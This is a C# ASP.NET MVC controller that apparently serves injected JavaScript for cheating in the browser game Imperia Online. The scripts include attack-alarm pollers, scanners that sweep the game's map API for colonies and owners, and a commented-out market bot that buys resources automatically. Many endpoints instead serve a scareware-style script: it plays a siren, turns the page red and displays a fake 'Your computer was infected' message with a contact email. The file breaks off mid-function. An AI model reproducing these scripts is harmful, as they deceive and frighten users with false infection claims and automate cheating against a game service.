using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace ioservice.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult TransportResources()
        {
            return JavaScript
                (
                "var sound = document.createElement('object');"+
                "sound.setAttribute('width', '5px');"+
                "sound.setAttribute('height', '5px');"+
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');"+
                "document.body.appendChild(sound);"+
                "document.body.style.background = 'red';"+
                "var ale = document.createElement('div');"+
                "ale.style.backgroundColor = 'red';"+
                "ale.style.zindex = 1001;"+
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';"+
                "ale.style.borderStyle = 'inset';"+
                "ale.style.marginTop = '-500px';"+
                "ale.style.marginLeft = '550px';"+
                "ale.style.height = '50px';"+
                "ale.style.width = '220px';"+
                "ale.style.display = 'block';"+
                "ale.style.position = 'absolute';"+
                "document.body.appendChild(ale);"
                );
        }

//        public ActionResult TrailTransportResources()
//        {
//            return JavaScript("setInterval(function transport(){" +
//   "xajax_transport_all(containersStuff.findContaner({saveName:'transportation',title:'Транспортни мисии'}));" +
//   "setTimeout(function(){" +
//       "$('div.ajax-window div.visual-loading.clear div button.button-v2').click();" +
//       "$('div.ajax-window /*table tbody tr td h3.header.feedback-active */a#closeMe1.closeAjaxWindow')[0].click();" +
//   "},2000);" +
//"},300000);");
//        }

        public ActionResult AttackChecker()
        {
            return JavaScript
                (
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);"
                );
        }

        public ActionResult Givenchy00()
        {
            return JavaScript(
                "document.body.style.background = 'lightgreen';" +
                "setInterval(" +
                "function checker(){" +
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "if(document.getElementsByClassName('incoming province')[0] != null){" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "}" +
                "xajax_settings(17,0,'',true);" +
                "},8000);"
                );
        }

        //public ActionResult SACh()
        //{
        //    return JavaScript(
        //        "document.body.style.background = 'lightgreen';" +
        //        "setInterval(" +
        //        "function checker(){" +
        //        "var sound = document.createElement('object');" +
        //        "sound.setAttribute('width', '5px');" +
        //        "sound.setAttribute('height', '5px');" +
        //        "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
        //        "if(document.getElementsByClassName('incoming province')[0] != null){" +
        //        "document.body.appendChild(sound);" +
        //        "document.body.style.background = 'red';" +
        //        "}" +
        //        "xajax_settings(17,0,'',true);" +
        //        "},5000);"
        //        );
        //}

        public ActionResult GetAllColonies()
        {

            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);");
        }

        public ActionResult ColFin()
        {
            string colonies =
                "var count = {nmbr: Number(1)};var servLabel = document.createElement('p');servLabel.textContent = 'Server Number:';servLabel.style.color = 'aqua';document.body.appendChild(servLabel);servLabel.style.display = 'block';servLabel.style.marginTop = '-650px';" +
                "var servNumber = document.createElement('input');servNumber.setAttribute('type', 'text');servNumber.setAttribute('id', 'servNumber');servNumber.style.width = '30px';servNumber.style.display = 'block';document.body.appendChild(servNumber);" +
                "var btn = document.createElement('input');btn.setAttribute('type','button');btn.setAttribute('value','Find');btn.setAttribute('id','btn');document.body.appendChild(btn);btn.addEventListener('click',function(){getColonies(1,1001);},false);" +
                "var fix = document.createElement('div');document.body.appendChild(fix);" +
                "var wripper = document.createElement('div');" +
                "wripper.setAttribute('id','wripper');" +
                "wripper.style.height = '80px';" +
                "wripper.style.width = '125px';" +
                "wripper.style.backgroundColor = 'red';" +
                "wripper.style.display = 'none';" +
                "wripper.style.borderStyle = 'outset';" +
                "document.body.appendChild(wripper);" +
                "var ldng = document.createElement('div');" +
                "ldng.setAttribute('id','ldng');" +
                "ldng.textContent = 'SCANING...... WAIT!!!';" +
                "ldng.style.height = '80px';" +
                "ldng.style. width = '125px';" +
                "ldng.style.display = 'none';" +
                "ldng.style.backgroundColor = 'red';" +
                "wripper.appendChild(ldng);" +
                "var fin = document.createElement('div');" +
                "fin.textContent = 'SCAN IS FINISHED FOR SCAN AGAIN YOU HAVE TO PRESS F5!';" +
                "fin.style.backgroundColor = 'green';" +
                "fin.setAttribute('id','fin');" +
                "fin.style.height = '80px';" +
                "fin.style.width = '125px';" +
                "fin.style.display = 'none';" +
                "wripper.appendChild(fin);" +
                "var diF = document.createElement('div');" +
                "diF.style.backgroundColor = 'gray';" +
                "diF.setAttribute('id','diF');" +
                "diF.style.position = 'absolute';" +
                "diF.style.zindex = '1001';" +
                "diF.style.marginTop = '500px';" +
                "diF.style.marginLeft = '300px';" +
                "diF.style.marginRight = '300px';" +
                "diF.style.paddingLeft = '30px';" +
                "document.body.appendChild(diF);" +
                "var getColonies = function w(from, to){" +
                "var rateVal = $('#rate').val();" +
                "var resTypeVal = $('#resType').val();" +
                "var ownerVal = $('#owner').val();" +
                "var param = [];" +
                "for(var s = from;s<to;s++){" +
                "param.push('&b='+s);}" +
                "$.ajax({" +
                "url  : 'http://www'+$('#servNumber').val()+'.imperiaonline.org/imperia/game_v5/game/json/dynamic_map_objects.php?b=0'+param.join('')+" +
                "\"'\"," +
                "type : 'GET'," +
                "contentType: 'application/json'," +
                "success: function(data){" +
                "document.getElementById('wripper').style.display = 'inline-block';" +
                "document.getElementById('ldng').style.display = 'inline-block';" +
                "setInterval(" +
                "function(){" +
                "$('#ldng').fadeOut(10000,'swing',function(){$('#ldng').fadeIn(1000);});},1000);" +
                "var d = jQuery.parseJSON(data);" +
                "for(var i =0; i < d.blocks.length; i++){" +
                "for(var j=0;j<d.blocks[i].data.length; j++){" +
                "for(var k=0;k<d.blocks[i].data[j].obs.length;k++){" +
                "for(var m=0;m<d.blocks[i].data[j].obs[k].ttp.length;m++){" +
                "if(d.blocks[i].data[j].obs[k].ttp[m].key == 'Owner'){" +
                "var find = d.blocks[i].data[j].obs[k].ttp;" +
                "var dummy = document.createElement('li');" +
                "dummy.style.padding = '3px';" +
                "dummy.textContent = 'Colony №'+' '+count.nmbr ++;" +
                "dummy.style.backgroundColor = 'lightBlue';" +
                "dummy.style.marginLeft = '-30px';" +
                "dummy.style.borderStyle = 'inset';" +
                "diF.appendChild(dummy);" +
                "for(var z= 0; z< find.length;z++){" +
                "var Li = document.createElement('li');" +
                "Li.style.borderStyle = 'inset';" +
                "Li.textContent = 'x - '+(d.blocks[i].data[j].x)/4+' '+'y - '+(d.blocks[i].data[j].y)/4+' '+ find[z].key+' '+ find[z].vl;" +
                "diF.appendChild(Li);}}}}}}" +
                "if(to < 40001){" +
                "from += 1000;" +
                "to += 1000;" +
                "getColonies(from, to);}" +
                "if(to == 40001){" +
                "from = 40001;" +
                "to = 40200;" +
                "getColonies(from,to);}" +
                "if(from > 40000){" +
                "console.log('SCAN IS FINISHED!');" +
                "document.getElementById('ldng').remove();" +
                "document.getElementById('fin').style.display = 'inline-block';}}," +
                "error: function (err) {}});};";
            return JavaScript(colonies);
        }

        public ActionResult CastleAttackChecker()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);"
                );
        }

        public ActionResult CastleCh()
        {
            return JavaScript(
                "document.body.style.background = 'aqua';" +
                "setInterval(" +
                "function checker(){" +
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('src', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "var currElements = document.getElementsByClassName('incoming castle');" +
                "for(var i=0;i<currElements.length;i++){" +
                "if(currElements[i].className == 'incoming castle'){" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "}" +
                "}" +
                "xajax_find_babysit(1, 1);" +
                "},5000);"
                );
        }

        public ActionResult GetResources()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);"
                );
        }

        public ActionResult RallyFin()
        {
            return JavaScript(
                "var count = {" +
                "nmbr: Number(1)};" +
                "var servLabel = document.createElement('p');" +
                "servLabel.textContent = 'Server Number:';" +
                "servLabel.style.color = 'aqua';" +
                "document.body.appendChild(servLabel);" +
                "servLabel.style.display = 'block';" +
                "servLabel.style.marginTop = '-650px';" +
                "var servNumber = document.createElement('input');" +
                "servNumber.setAttribute('type', 'text');" +
                "servNumber.setAttribute('id', 'servNumber');" +
                "servNumber.style.width = '30px';" +
                "servNumber.style.display = 'block';" +
                "document.body.appendChild(servNumber);" +
                "var ownerLabel = document.createElement('p');" +
                "ownerLabel.textContent = 'Owner';" +
                "ownerLabel.style.color = 'aqua';" +
                "document.body.appendChild(ownerLabel);" +
                "ownerLabel.display = 'block';" +
                "var owner = document.createElement('input');" +
                "owner.setAttribute('type','text');" +
                "owner.setAttribute('id','owner');" +
                "owner.style.width = '120px';" +
                "owner.style.display = 'block';" +
                "document.body.appendChild(owner);" +
                "var btn = document.createElement('input');" +
                "btn.setAttribute('type','button');" +
                "btn.setAttribute('value','Find');" +
                "btn.setAttribute('id','btn');" +
                "document.body.appendChild(btn);" +
                "btn.addEventListener('click',function(){getColonies(1,1001);},false);" +
                "var fix = document.createElement('div');" +
                "document.body.appendChild(fix);" +
                "var wripper = document.createElement('div');" +
                "wripper.setAttribute('id','wripper');" +
                "wripper.style.height = '80px';" +
                "wripper.style.width = '125px';" +
                "wripper.style.backgroundColor = 'red';" +
                "wripper.style.display = 'none';" +
                "wripper.style.borderStyle = 'outset';" +
                "document.body.appendChild(wripper);" +
                "var ldng = document.createElement('div');" +
                "ldng.setAttribute('id','ldng');" +
                "ldng.textContent = 'SCANING...... WAIT!!!';" +
                "ldng.style.height = '80px';" +
                "ldng.style. width = '125px';" +
                "ldng.style.display = 'none';" +
                "ldng.style.backgroundColor = 'red';" +
                "wripper.appendChild(ldng);" +
                "var fin = document.createElement('div');" +
                "fin.textContent = 'SCAN IS FINISHED FOR SCAN AGAIN YOU HAVE TO PRESS F5!';" +
                "fin.style.backgroundColor = 'green';" +
                "fin.setAttribute('id','fin');" +
                "fin.style.height = '80px';" +
                "fin.style.width = '125px';" +
                "fin.style.display = 'none';" +
                "wripper.appendChild(fin);" +
                "var diF = document.createElement('div');" +
                "diF.style.backgroundColor = 'gray';" +
                "diF.setAttribute('id','diF');" +
                "diF.style.position = 'absolute';" +
                "diF.style.zindex = '1001';" +
                "diF.style.marginTop = '500px';" +
                "diF.style.marginLeft = '300px';" +
                "diF.style.marginRight = '300px';" +
                "diF.style.paddingLeft = '30px';" +
                "document.body.appendChild(diF);" +
                "function getColonies(from, to){" +
                "var rateVal = $('#rate').val(); " +
                "var resTypeVal = $('#resType').val();" +
                "var ownerVal = $('#owner').val();" +
                "var param = [];" +
                "for(var s = from;s<to;s++){" +
                "param.push('&b='+s);}" +
                "$.ajax({" +
                "url  : 'http://www'+$('#servNumber').val()+'.imperiaonline.org/imperia/game_v5/game/json/dynamic_map_objects.php?b=0'+param.join('')+" +
                "\"'\"," +
                "type : 'GET'," +
                "contentType: 'application/json'," +
                "success: function(data){" +
                "document.getElementById('wripper').style.display = 'inline-block';" +
                "document.getElementById('ldng').style.display = 'inline-block';" +
                "setInterval(" +
                "function(){" +
                "$('#ldng').fadeOut(10000,'swing',function(){$('#ldng').fadeIn(1000);});},1000);" +
                "var d = jQuery.parseJSON(data);" +
                "for(var i =0; i < d.blocks.length; i++){" +
                "for(var j=0;j<d.blocks[i].data.length; j++){" +
                "for(var k=0;k<d.blocks[i].data[j].obs.length;k++){" +
                "for(var m=0;m<d.blocks[i].data[j].obs[k].ttp.length;m++){" +
                "if(d.blocks[i].data[j].obs[k].ttp[m].vl == document.getElementById('owner').value){" +
                "var find = d.blocks[i].data[j].obs[k].ttp;" +
                "var dummy = document.createElement('li');" +
                "dummy.style.padding = '3px';" +
                "dummy.textContent = '№'+' '+count.nmbr ++;" +
                "dummy.style.backgroundColor = 'lightBlue';" +
                "dummy.style.marginLeft = '-30px';" +
                "dummy.style.borderStyle = 'inset';" +
                "diF.appendChild(dummy);" +
                "for(var z= 0; z< find.length;z++){" +
                "var Li = document.createElement('li');" +
                "Li.style.borderStyle = 'inset'; " +
                "Li.textContent = 'x - '+(d.blocks[i].data[j].x)/4+' '+'y - '+(d.blocks[i].data[j].y)/4+' '+ find[z].key+' '+ find[z].vl;" +
                "diF.appendChild(Li);}}}}}}" +
                "if(to < 40001){" +
                "from += 1000;" +
                "to += 1000;" +
                "getColonies(from, to);" +
                "}" +
                "if(to == 40001){" +
                "from = 40001;" +
                "to = 40200;" +
                "getColonies(from,to);" +
                "}" +
                "if(from > 40000){" +
                "document.getElementById('ldng').remove();" +
                "document.getElementById('fin').style.display = 'inline-block';" +
                "}}," +
                "error: function (err) {}});}"
                );
        }

        public ActionResult ResearchesReduceBy10Min()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);"
                );
        }

        //public ActionResult TrailResearchesReduceBy10Min()
        //{
        //    return JavaScript(
        //        "setInterval(function(){xajax_listResearches('5', '2', '', -1, 0, 0, 'NULL', 3);},3601000);"
        //        );
        //}

        public ActionResult BuildingsReduceBy10Min()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);"
                );
        }

        //public ActionResult TrailBuildingsReduceBy10Min()
        //{
        //    return JavaScript(
        //        "setInterval(function(){xajax_allBuildingsCutShort('7');},3601000);"
        //        );
        //}

        public ActionResult AbandonedEmpires()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);");
        }

        //public ActionResult AE()
        //{
        //    return JavaScript(
        //        "var servLabel = document.createElement('p');" +
        //        "servLabel.textContent = 'Server Number:';" +
        //        "servLabel.style.color = 'aqua';" +
        //        "document.body.appendChild(servLabel);" +
        //        "servLabel.style.display = 'block';" +
        //        "servLabel.style.marginTop = '-650px';" +
        //        "var servNumber = document.createElement('input');" +
        //        "servNumber.setAttribute('type', 'text');" +
        //        "servNumber.setAttribute('id', 'servNumber');" +
        //        "servNumber.style.width = '30px';" +
        //        "servNumber.style.display = 'block';" +
        //        "document.body.appendChild(servNumber);" +
        //        "var btn = document.createElement('input');" +
        //        "btn.setAttribute('type','button');" +
        //        "btn.setAttribute('value','Search');" +
        //        "btn.setAttribute('id','searchBtn');" +
        //        "btn.style.backgroundColor = 'green';" +
        //        "btn.style.display = 'block';" +
        //        "document.body.appendChild(btn);" +
        //        "btn.addEventListener('click',function(){getEmpires(1,1001);},false);" +
        //        "var rezultat = document.createElement('div');" +
        //        "rezultat.setAttribute('id','rezultat');" +
        //        "rezultat.style.backgroundColor = 'grey';" +
        //        "rezultat.style.display = 'none';" +
        //        "rezultat.style.width = '130px';" +
        //        "document.body.appendChild(rezultat);" +
        //        "var close = document.createElement('input');" +
        //        "close.setAttribute('id','close');" +
        //        "close.setAttribute('type','button');" +
        //        "close.setAttribute('value','x');" +
        //        "close.style.display = 'inline-block';" +
        //        "close.style.backgroundColor = 'red';" +
        //        "close.style.marginTop = '2px';" +
        //        "close.style.marginLeft = '106px';" +
        //        "rezultat.appendChild(close);" +
        //        "close.addEventListener('click',rezultatClose,false);" +
        //        "var paragraph = document.createElement('p');" +
        //        "paragraph.textContent = 'Abandoned Empires';" +
        //        "rezultat.appendChild(paragraph);" +
        //        "var wrapp = document.createElement('div');" +
        //        "wrapp.setAttribute('id','wrapper');" +
        //        "wrapp.style.display = 'inline-block';" +
        //        "rezultat.appendChild(wrapp);" +
        //        "function rezultatClose(){" +
        //         "document.getElementById('wrapper').textContent = '';" +
        //        "rezultat.style.display = 'none';}" +
        //        "abandonedEmp = [];" +
        //        "function contains(ar,obj){" +
        //        "for(var check=0;check<ar.length;check++){" +
        //        "if(ar[check] == obj){" +
        //        "return true;}}" +
        //        "return false;}" +
        //        "var getEmpires = function w(from, to){" +
        //        "document.getElementById('searchBtn').style.display = 'none';" +
        //        "document.getElementById('rezultat').style.display = 'block';" +
        //        "var param = [];" +
        //        "for(var s = from;s<to;s++){" +
        //        "param.push('&b='+s);}" +
        //        "$.ajax({" +
        //        "url  : 'http://www'+$('#servNumber').val()+'.imperiaonline.org/imperia/game_v5/game/json/dynamic_map_objects.php?b=0'+param.join('')+" +
        //        "\"'\"," +
        //        "type : 'GET'," +
        //        "contentType: 'application/json'," +
        //        "success: function(data){" +
        //        "var count = 1;" +
        //        "var d = jQuery.parseJSON(data);" +
        //        "for(var i =0; i < d.blocks.length; i++){" +
        //        "for(var j=0;j<d.blocks[i].data.length; j++){" +
        //                "for(var k=0;k<d.blocks[i].data[j].obs.length;k++){" +
        //                    "for(var m=0;m<d.blocks[i].data[j].obs[k].ttp.length;m++){" +
        //                        "if(d.blocks[i].data[j].obs[k].box == 1 " +
        //                        "&d.blocks[i].data[j].obs[k].ttp[m].key == 'User Name'" +
        //                           "&&contains(abandonedEmp, d.blocks[i].data[j].obs[k].ttp[m].vl) == false){" +
        //                           "abandonedEmp.push(d.blocks[i].data[j].obs[k].ttp[m].vl);" +
        //                           "var Li = document.createElement('li');" +
        //                            "Li.textContent = d.blocks[i].data[j].obs[k].ttp[m].key+'-'+d.blocks[i].data[j].obs[k].ttp[m].vl;" +
        //                            "Li.style.borderStyle = 'inset';" +
        //                            "if(count %2 !=0){" +
        //                            "Li.style.backgroundColor = 'lightGreen';" +
        //                            "}" +
        //                            "if(count %2 == 0){" +
        //                            "Li.style.backgroundColor = 'lightBlue';" +
        //                            "}" +
        //                           "document.getElementById('wrapper').appendChild(Li);" +
        //                            "count++;" +
        //                        "}}}}}" +
        //        "if(to < 40001){" +
        //        "from += 1000;" +
        //        "to += 1000;" +
        //        "getEmpires(from, to);" +
        //        "}" +
        //        "else if(to == 40001){" +
        //        "from = 40001;" +
        //        "to = 40200;" +
        //        "getEmpires(from,to);" +
        //        "}" +
        //        "else if(to > 40129){" +
        //        "document.getElementById('close').style.backgroundColor = 'green';" +
        //        "getEmpires(1,1001);}}," +
        //        "error: function (err) {}});};"
        //        );
        //}


//        public ActionResult TrailMarketBot() 
//        {
//            return JavaScript(
//"var woodMaxPrice = prompt('Wood max price:');var ironMaxPrice = prompt('Iron max price:');var stoneMaxPrice = prompt('Stone max price:');var e = $.Event('keyup');e.keyCode= 39;var curPrices = {wood: 0,iron: 0,stone: 0};"+
//"var initialise = function init(){var market = document.getElementById('market');curPrices.wood = market.getElementsByTagName('li')[2].textContent;curPrices.iron = market.getElementsByTagName('li')[3].textContent;curPrices.stone =  market.getElementsByTagName('li')[4].textContent;};"+
//"var bought = document.createElement('div');bought.style.marginLeft =  '130px';bought.style.backgroundColor = 'lightBlue';bought.style.borderStyle = 'inset';bought.setAttribute('id','bought');bought.style.position = 'absolute';bought.textContent = 'ЗАКУПЕНИ РЕСУРСИ:';document.body.appendChild(bought);"+
//"var buyWood = function bW(){xajax_buyResources(123456,1);setTimeout(function(){var mbx = document.getElementById('messagebox123456');var woodQuanty = mbx.getElementsByTagName('a')[1].textContent;var woodInpt = document.getElementById('amountToBuyId');$('#amountToBuyId').val(woodQuanty);$('#amountToBuyId').trigger(e);$('#buyForm .button-v2').submit();var boughtLi = document.createElement('li');boughtLi.style.backgroundColor = 'lightBlue';boughtLi.setAttribute('id','boughtLi');boughtLi.style.display = 'iline-block';boughtLi.style.borderStyle = 'inset';boughtLi.textContent = 'bought '+woodQuanty+' wood  for '+curPrices.wood+' per а unit';document.getElementById('bought').appendChild(boughtLi);},700);};"+
//"var buyIron = function bI(){xajax_buyResources(123456,2);setTimeout(function(){var mbx = document.getElementById('messagebox123456');var ironQuanty = mbx.getElementsByTagName('a')[1].textContent;var ironInpt = $('#amountToBuyId');$('#amountToBuyId').val(ironQuanty);$('#amountToBuyId').trigger(e);$('#buyForm .button-v2').submit();var boughtLi = document.createElement('li');boughtLi.style.backgroundColor = 'lightBlue';boughtLi.setAttribute('id','boughtLi');boughtLi.style.borderStyle = 'inset';boughtLi.textContent = 'bought '+ironQuanty+' iron  for '+curPrices.iron+' per а unit';document.getElementById('bought').appendChild(boughtLi);},700);};"+
//"var buyStone = function bS(){"+
//    "xajax_buyResources(123456,3);"+
//    "setTimeout(function(){"+
//        "var mbx = document.getElementById('messagebox123456');"+
//        "var stoneQuanty = mbx.getElementsByTagName('a')[1].textContent;"+
//        "var stoneInpt = $('#amountToBuyId');"+
//        "$('#amountToBuyId').val(stoneQuanty);"+
//        "$('#amountToBuyId').trigger(e);"+
//        "$('#buyForm .button-v2').submit();"+
//        "var boughtLi = document.createElement('li');"+
//        "boughtLi.style.backgroundColor = 'lightBlue';"+
//        "boughtLi.setAttribute('id','boughtLi');"+
//        "boughtLi.style.borderStyle = 'inset';"+
//        "boughtLi.textContent = 'bought '+stoneQuanty+' stone for '+curPrices.stone+' per а unit';"+
//        "document.getElementById('bought').appendChild(boughtLi);},700);};"+
//"var btn = document.createElement('input');btn.setAttribute('value','Start');btn.setAttribute('type','button');btn.setAttribute('id','startBtn');btn.style.marginTop = '-650px';btn.style.display = 'block';btn.style.backgroundColor = 'red';document.body.appendChild(btn);btn.addEventListener('click',makeDeal,false);"+
//"var info = document.createElement('div');info.setAttribute('id','info');info.style.display = 'block';info.style.width = '125px';info.style.marginTop = '5px';document.body.appendChild(info);"+
//"var woodInfo = document.createElement('li');woodInfo.style.backgroundColor = 'lightBlue';woodInfo.style.borderStyle = 'inset';woodInfo.textContent = 'Wood max price '+woodMaxPrice;document.getElementById('info').appendChild(woodInfo);"+
//"var ironInfo = document.createElement('li');ironInfo.style.backgroundColor = 'lightBlue';ironInfo.style.borderStyle = 'inset';ironInfo.textContent = 'Iron max price '+ironMaxPrice;document.getElementById('info').appendChild(ironInfo);"+
//"var stoneInfo = document.createElement('li');stoneInfo.style.backgroundColor = 'lightBlue';stoneInfo.style.borderStyle = 'inset';stoneInfo.textContent = 'Stone max price '+stoneMaxPrice;document.getElementById('info').appendChild(stoneInfo);"+
//"xajax_tradeTabs(containersStuff.findContaner({saveName:'trade',title:'Пазар'}),2,1);"+
//"function makeDeal(){"+
//    "xajax_buyResources(123456,1);"+
//    "initialise();"+
//    "$(document).ready(function(){"+
//        "document.getElementById('startBtn').style.backgroundColor = 'green';"+
//        "document.getElementById('startBtn').value = 'Working';"+
//    "});"+
//        "if(Number(curPrices.wood) <=Number(woodMaxPrice)){"+
//            "buyWood();setTimeout(function(){makeDeal();},2000);}"+
//        "else if(Number(curPrices.iron)<=Number(ironMaxPrice)){"+
//            "buyIron();setTimeout(function(){makeDeal();},2000);}"+
//        "else if(Number(curPrices.stone)<=Number(stoneMaxPrice)){"+
//            "buyStone();setTimeout(function(){makeDeal();},2000);}"+
//       "else{setTimeout(function(){makeDeal();},300);}}"
//            );
//        }


        public ActionResult MarketBot()
        {
            return JavaScript(
                "var sound = document.createElement('object');" +
                "sound.setAttribute('width', '5px');" +
                "sound.setAttribute('height', '5px');" +
                "sound.setAttribute('data', 'http://www.soundrangers.com/demos/sirens/ambulance_siren.mp3');" +
                "document.body.appendChild(sound);" +
                "document.body.style.background = 'red';" +
                "var ale = document.createElement('div');" +
                "ale.style.backgroundColor = 'red';" +
                "ale.style.zindex = 1001;" +
                "ale.textContent = 'Your computer was infected for mor info - serviceablesoft@gmail.com';" +
                "ale.style.borderStyle = 'inset';" +
                "ale.style.marginTop = '-500px';" +
                "ale.style.marginLeft = '550px';" +
                "ale.style.height = '50px';" +
                "ale.style.width = '220px';" +
                "ale.style.display = 'block';" +
                "ale.style.position = 'absolute';" +
                "document.body.appendChild(ale);");
        }
        public ActionResult SicretMB()
        {
            return JavaScript(
                "var createElements = function(){" +
"var btn = document.createElement('input');"+
"btn.setAttribute('value','Start');"+
"btn.setAttribute('type','button');"+
"btn.setAttribute('id','startBtn');"+
"btn.style.marginTop = '-650px';"+
"btn.style.display = 'block';"+
"btn.style.backgroundColor = 'red';"+
"document.body.appendChild(btn);"+
"btn.addEventListener('click',makeDeal,false);"+
"var info = document.createElement('div');"+
"info.setAttribute('id','info');"+
"info.style.display = 'block';"+
"info.style.width = '125px';"+
"info.style.marginTop = '5px';"+
"document.body.appendChild(info);"+
"var woodMaxPriceLabel = document.createElement('p');"+
"woodMaxPriceLabel.setAttribute('id','woodMaxPriceLabel');"+
"woodMaxPriceLabel.style.display = 'block';"+
"woodMaxPriceLabel.textContent = 'Wood Max Price:';"+
"document.body.appendChild(woodMaxPriceLabel);"+
"var woodMaxPriceBox = document.createElement('input');"+
"woodMaxPriceBox.setAttribute('id','woodMaxPriceBox');"+
"woodMaxPriceBox.style.display = 'block';"+
"woodMaxPriceBox.style.width = '125px';"+
"document.body.appendChild(woodMaxPriceBox);"+
"var ironMaxPriceLabel = document.createElement('p');"+
"ironMaxPriceLabel.setAttribute('id','ironMaxPriceLabel');"+
"ironMaxPriceLabel.style.display = 'block';"+
